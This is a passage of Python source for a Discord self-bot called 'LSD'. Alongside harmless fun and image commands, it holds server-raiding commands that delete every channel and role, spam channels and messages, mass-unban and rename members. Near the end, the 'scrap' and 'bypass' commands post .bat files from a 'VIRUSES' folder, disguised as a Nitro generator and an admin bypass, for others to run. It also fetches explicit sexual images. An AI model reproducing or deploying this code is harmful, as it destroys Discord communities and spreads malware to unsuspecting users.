            return


@LSD.command(aliases=["masschannels", "masschannel", "ctc"])
async def spamchannels(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="LSD")
        except:
            return


@LSD.command(aliases=["delchannel"])
async def delchannels(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return


@LSD.command(aliases=["deleteroles"])
async def delroles(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass


@LSD.command(aliases=["purgebans", "unbanall"])
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass


@LSD.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)


@LSD.command()
async def dm(ctx, user: discord.Member, *, message):
    await ctx.message.delete()
    user = LSD.get_user(user.id)
    if ctx.author.id == LSD.user.id:
        return
    else:
        try:
            await user.send(message)
        except:
            pass


@LSD.command(name='get-color', aliases=['color', 'colour', 'sc', "hexcolor", "rgb"])
async def _get_color(ctx, *, color: discord.Colour):
    await ctx.message.delete()
    file = io.BytesIO()
    Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
    file.seek(0)
    em = discord.Embed(color=color, title=f'{str(color)}')
    em.set_image(url='attachment://color.png')
    await ctx.send(file=discord.File(file, 'color.png'), embed=em)


@LSD.command(aliases=['rainbowrole'])
async def rainbow(ctx, *, role):
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=role)
    while True:
        try:
            await role.edit(role=role, colour=RandomColor())
            await asyncio.sleep(10)
        except:
            break


@LSD.command()
async def ping(ctx):
    await ctx.message.delete()
    before = time.monotonic()
    message = await ctx.send("Pinging...")
    ping = (time.monotonic() - before) * 1000
    await message.edit(content=f"`{int(ping)} ms`")


@LSD.command(aliases=["guildinfo"])
async def serverinfo(ctx):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    embed = discord.Embed(title=f"{ctx.guild.name}",
                          description=f"{len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
                          timestamp=datetime.datetime.utcnow(), color=discord.Color.blue())
    embed.add_field(name="Server created at", value=f"{ctx.guild.created_at.strftime(date_format)}")
    embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
    embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
    embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
    embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
    await ctx.send(embed=embed)


@LSD.command()
async def wizz(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.TextChannel):
        print("hi")
        initial = random.randrange(0, 60)
        message = await ctx.send(f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...\nInitiating Mass-DM`")
    elif isinstance(ctx.message.channel, discord.DMChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
    elif isinstance(ctx.message.channel, discord.GroupChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`")


@LSD.command(name='8ball')
async def _ball(ctx, *, question):
    await ctx.message.delete()
    responses = [
        'That is a resounding no',
        'It is not looking likely',
        'Too hard to tell',
        'It is quite possible',
        'That is a definite yes!',
        'Maybe',
        'There is a good chance'
    ]
    answer = random.choice(responses)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
    await ctx.send(embed=embed)


@LSD.command(aliases=['slots', 'bet', "slotmachine"])
async def slot(ctx):
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if a == b == c:
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} No match, you lost"}))


@LSD.command()
async def tts(ctx, *, message):
    await ctx.message.delete()
    buff = await do_tts(message)
    await ctx.send(file=discord.File(buff, f"{message}.wav"))


@LSD.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
async def guildicon(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em)


@LSD.command(aliases=['serverbanner'])
async def banner(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.banner_url)
    await ctx.send(embed=em)


@LSD.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
    await ctx.send(embed=embed)


@LSD.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        await channel.edit(name=name)


@LSD.command(aliases=["renameserver", "nameserver"])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)


@LSD.command()
async def nickall(ctx, nickname):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
        except:
            pass


@LSD.command()
async def youtube(ctx, *, search):
    await ctx.message.delete()
    query_string = parse.urlencode({'search_query': search})
    html_content = request.urlopen('http://www.youtube.com/results?' + query_string)
    search_results = re.findall('href=\"\\/watch\\?v=(.{11})', html_content.read().decode())
    await ctx.send('https://www.youtube.com/watch?v=' + search_results[0])


@LSD.command()
async def prefix(ctx, prefix):
    await ctx.message.delete()
    LSD.command_prefix = str(prefix)


@LSD.command()
async def abc(ctx):
    await ctx.message.delete()
    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u',
           'v', 'w', 'x', 'y', 'z']
    message = await ctx.send(ABC[0])
    await asyncio.sleep(2)
    for _next in ABC[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)


@LSD.command(aliases=["100"])
async def _100(ctx):
    await ctx.message.delete()
    message = ctx.send("Starting count to 100")
    await asyncio.sleep(2)
    for _ in range(100):
        await message.edit(content=_)
        await asyncio.sleep(2)


@LSD.command(aliases=['bitcoin'])
async def btc(ctx):
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)


@LSD.command()
async def hastebin(ctx, *, message):
    await ctx.message.delete()
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")


@LSD.command(aliases=["fancy"])
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```' + r + '```') > 2000:
        return
    await ctx.send(f"```{r}```")


@LSD.command(pass_context=True, aliases=["cyclename", "autoname", "autonick", "cycle"])
async def cyclenick(ctx, *, text):
    await ctx.message.delete()
    global cycling
    cycling = True
    while cycling:
        name = ""
        for letter in text:
            name = name + letter
            await ctx.message.author.edit(nick=name)


@LSD.command(aliases=["stopcyclename", "cyclestop", "stopautoname", "stopautonick", "stopcycle"])
async def stopcyclenick(ctx):
    await ctx.message.delete()
    global cycling
    cycling = False


@LSD.command()
async def acceptfriends(ctx):
    await ctx.message.delete()
    for relationship in LSD.user.relationships:
        if relationship == discord.RelationshipType.incoming_request:
            await relationship.accept()


@LSD.command()
async def ignorefriends(ctx):
    await ctx.message.delete()
    for relationship in LSD.user.relationships:
        if relationship is discord.RelationshipType.incoming_request:
            relationship.delete()


@LSD.command()
async def delfriends(ctx):
    await ctx.message.delete()
    for relationship in LSD.user.relationships:
        if relationship is discord.RelationshipType.friend:
            await relationship.delete()


@LSD.command()
async def clearblocked(ctx):
    await ctx.message.delete()
    print(LSD.user.relationships)
    for relationship in LSD.user.relationships:
        if relationship is discord.RelationshipType.blocked:
            print(relationship)
            await relationship.delete()


@LSD.command(aliases=["changeregions", "changeregion", "regionschange"])
async def regionchange(ctx, amount):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        print()


@LSD.command()
async def kickgc(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        for recipient in ctx.message.channel.recipients:
            await ctx.message.channel.remove_recipients(recipient)


@LSD.command(aliases=["gcleave"])
async def leavegc(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.message.channel.leave()


@LSD.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)


@LSD.command()
async def dog(ctx):
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    link = str(r['message'])
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_dog.png"))
    except:
        await ctx.send(link)


@LSD.command()
async def cat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.thecatapi.com/v1/images/search").json()
    link = str(r[0]["url"])
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_cat.png"))
    except:
        await ctx.send(link)


@LSD.command()
async def sadcat(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/sadcat").json()
    link = str(r['file'])
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_sadcat.png"))
    except:
        await ctx.send(link)


@LSD.command()
async def bird(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.alexflipnote.dev/birb").json()
    link = str(r['file'])
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_bird.png"))
    except:
        await ctx.send(link)


@LSD.command()
async def fox(ctx):
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    link = str(r["image"])
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_fox.png"))
    except:
        await ctx.send(link)


@LSD.command()
async def anal(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_anal.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def erofeet(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/erofeet")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_erofeet.png"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def feet(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feetg")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_feet.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def hentai(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_hentai.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def boobs(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_boobs.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def tits(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_tits.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def blowjob(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_blowjob.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command(aliases=["neko"])
async def lewdneko(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_neko.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def lesbian(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_lesbian.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def cumslut(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cum")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_cumslut.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command(aliases=["vagina"])
async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_pussy.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def waifu(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/waifu")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"LSD_waifu.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def feed(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"LSD_feed.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def tickle(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tickle")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"LSD_tickle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def slap(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"LSD_slap.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def hug(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"LSD_hug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def cuddle(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cuddle")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"LSD_cuddle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def smug(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/smug")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"LSD_smug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def pat(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"LSD_pat.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def kiss(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    try:
        async with aiohttp.LSDSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"LSD_kiss.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@LSD.command()
async def uptime(ctx):
    await ctx.message.delete()
    now = datetime.datetime.utcnow()  # Timestamp of when uptime function is run
    delta = now - start_time
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)
    if days:
        time_format = "**{d}** days, **{h}** hours, **{m}** minutes, and **{s}** seconds."
    else:
        time_format = "**{h}** hours, **{m}** minutes, and **{s}** seconds."
    uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
    await ctx.send(uptime_stamp)


@LSD.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == LSD.user).map(
            lambda m: m):
        try:
            await message.delete()
        except:
            pass


@LSD.command(name='group-leaver',
             aliase=['leaveallgroups', 'leavegroup', 'leavegroups', "groupleave", "groupleaver"])
async def _group_leaver(ctx):
    await ctx.message.delete()
    for channel in LSD.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()


@LSD.command(aliases=["streaming"])
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url,
    )
    await LSD.change_presence(activity=stream)


@LSD.command(alises=["game"])
async def playing(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await LSD.change_presence(activity=game)


@LSD.command(aliases=["listen"])
async def listening(ctx, *, message):
    await ctx.message.delete()
    await LSD.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))


@LSD.command(aliases=["watch"])
async def watching(ctx, *, message):
    await ctx.message.delete()
    await LSD.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
        ))


@LSD.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.message.delete()
    await LSD.change_presence(activity=None, status=discord.Status.dnd)


@LSD.command()
async def reverse(ctx, *, message):
    await ctx.message.delete()
    message = message[::-1]
    await ctx.send(message)


@LSD.command()
async def shrug(ctx):
    await ctx.message.delete()
    shrug = r'¯\_(ツ)_/¯'
    await ctx.send(shrug)


@LSD.command()
async def lenny(ctx):
    await ctx.message.delete()
    lenny = '( ͡° ͜ʖ ͡°)'
    await ctx.send(lenny)


@LSD.command(aliases=["fliptable"])
async def tableflip(ctx):
    await ctx.message.delete()
    tableflip = '(╯°□°）╯︵ ┻━┻'
    await ctx.send(tableflip)


@LSD.command()
async def unflip(ctx):
    await ctx.message.delete()
    unflip = '┬─┬ ノ( ゜-゜ノ)'
    await ctx.send(unflip)


@LSD.command()
async def bold(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('**' + message + '**')


@LSD.command()
async def censor(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('||' + message + '||')


@LSD.command()
async def underline(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('__' + message + '__')


@LSD.command()
async def italicize(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('*' + message + '*')


@LSD.command()
async def strike(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('~~' + message + '~~')


@LSD.command()
async def quote(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('> ' + message)


@LSD.command()
async def code(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('`' + message + "`")


@LSD.command(name='rolecolor')
async def _role_hexcode(ctx, *, role: discord.Role):
    await ctx.message.delete()
    await ctx.send(f"{role.name} : {role.color}")


@LSD.command()
async def empty(ctx):
    await ctx.message.delete()
    await ctx.send(chr(173))


###########################################################################################
###########################################################################################
########### CHANGE ALL DIRECTORIES TO YOUR DIRECTORY TO THE FILES #########################
###########################################################################################
###########################################################################################


@LSD.command(aliases=["Scrap", "SCRAP"], pass_context=True)
async def scrap(ctx):
    await ctx.message.delete()
    await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/toxic-nitrogen.bat"))


@LSD.command()
async def everyone(ctx):
    await ctx.message.delete()
    await ctx.send('https://@everyone@google.com')


@LSD.command(aliases=["logout"])
async def shutdown(ctx):
    await ctx.message.delete()
    await LSD.logout()


@LSD.command(aliases=["nitrogen"])
async def nitro(ctx):
    await ctx.message.delete()
    await ctx.send(Nitro())


@LSD.command(aliases=["Bypass", "BYPASS"], pass_context=True)
async def bypass(ctx):
    await ctx.message.delete()
    await ctx.send(file=discord.File(r"home/code-red/Desktop/LSD/VIRUSES/Discord-Admin-Bypass v1.0.bat"))


@LSD.command(pass_context=True)
async def scra(ctx):
    await ctx.message.delete()
